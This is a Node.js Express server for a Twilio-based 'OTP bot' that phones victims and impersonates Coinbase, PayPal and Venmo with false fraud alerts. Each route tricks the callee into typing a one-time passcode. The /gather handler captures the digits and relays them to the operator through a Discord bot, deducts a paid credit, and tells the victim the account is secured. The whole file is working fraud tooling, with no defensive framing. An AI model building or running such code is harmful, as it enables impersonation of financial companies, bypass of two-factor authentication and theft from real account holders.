require("dotenv").config()
const express = require('express');
const app = express();
const urlencoded = require('body-parser').urlencoded;
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const ev = require('./caller').ev
const atob = require('atob')
const bot = require("./bot/src/index").bot
const { MessageEmbed } = require("discord.js")

// Parse incoming POST params with Express middleware
app.use(urlencoded({ extended: false }));

app.post('/coinbase', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();

    // Use the <Gather> verb to collect user input
    const gather = twiml.gather({
        action: '/gather',
        method: 'POST',
        input: 'dtmf',
        numDigits: 6,
    });
    gather.say("Automated Alert from Coinbase. Your account has sent 250$ to an insecure and fraudulent address. Please provide the one time passcode we just sent you in the dialpad.")

    response.type('text/xml');
    response.send(twiml.toString());
});

// Create a route that will handle Twilio webhook requests, sent as an
// HTTP POST to /voice in our application
app.post('/voice', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();
    
    // Use the <Gather> verb to collect user input
        const gather = twiml.gather({
            action: '/gather',
            method: 'POST',
            input: 'dtmf',
            numDigits: 6,
        });
        gather.say("Automated Alert From PayPal. Your account has been compromised. We have sent you a one time code to verify your identity. Please provide the code to this number with the dialpad.");

    response.type('text/xml');
    response.send(twiml.toString());
});

app.post('/venmo', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();
    
    // Use the <Gather> verb to collect user input
        const gather = twiml.gather({
            action: '/gather',
            method: 'POST',
            input: 'dtmf',
            numDigits: 6,
        });
        gather.say("This is a automated call from Venmo, You recently sent a payment for 550 Dollars to John Cramer, and we believe it is a fraudulent transfer, We have sent you a code, Please enter it in the dial pad To confirm your identity to cancel the payment")
        
    response.type('text/xml');
    response.send(twiml.toString());
});

app.post('/gather', (request, response) => {

    const twiml = new VoiceResponse();

    if (request.body.Digits) {
        console.log("Acquired Code: " + request.body.Digits)
        
        var obj = bot.calls.get(bot.idtosid.get(bot.abchannel).sid)
        obj.code = request.body.Digits
        bot.calls.set(bot.idtosid.get(bot.abchannel), obj)
        bot.chs.get(bot.idtosid.get(bot.abchannel).sid).send(`Your code is: **${request.body.Digits}**`)
        twiml.say("YOUR ACCOUNT WAS SECURED")
        twiml.hangup()
        var db = new bot.db.table("credits")
        var creds = db.has(obj.id)
        if(creds > 1) {
            db.set(obj.id, Math.floor(creds - 1))
        } else {
            db.set(obj.id, 0)
        }
        bot.abchlog.send(`${obj.si}`, {
            embed: new MessageEmbed()
                .setTitle(`New OTP call.`)
                .addField("To:", "no lol", true)
                .addField("From:", obj.ca.from, true)
                .addField("Code:", obj.ca.code, true)
                .addField("Instantiater:", bot.users.cache.get(obj.id))
            })
    } else {
        bot.calls.get(bot.idtosid.get(bot.abchannel).sid).send(`Your code was not entered :(`)
        return;
    }

    response.type('text/xml');
    response.send(twiml.toString());
});

console.log('Twilio Client app HTTP server running at http://127.0.0.1:3000');
app.listen(3000);